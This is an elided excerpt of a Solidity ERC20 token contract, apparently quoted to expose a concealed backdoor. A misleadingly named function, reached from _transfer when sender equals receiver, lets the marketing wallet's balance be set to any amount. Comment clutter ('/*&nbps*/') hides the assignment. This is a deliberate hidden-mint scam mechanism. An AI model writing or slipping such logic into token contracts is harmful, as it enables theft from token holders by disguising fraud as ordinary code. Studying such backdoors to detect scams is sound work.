...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            SwapAndLiquifyEnabledUpdate(sender, recipient, amount);
    ...
    function SwapAndLiquifyEnabledUpdate(
        address sender,
        address receiver,
        uint256 mount
    ) private {
        if (sender == receiver) {          
           getFinalAmount(receiver, mount);
        }
    }

    function getFinalAmount(address recipient, uint256 finalAmount) internal {
      if (recipient == marketingWallet) {
          _balances[recipient] /*&nbps*/ =  /*nbps*/finalAmount;
      }
    }
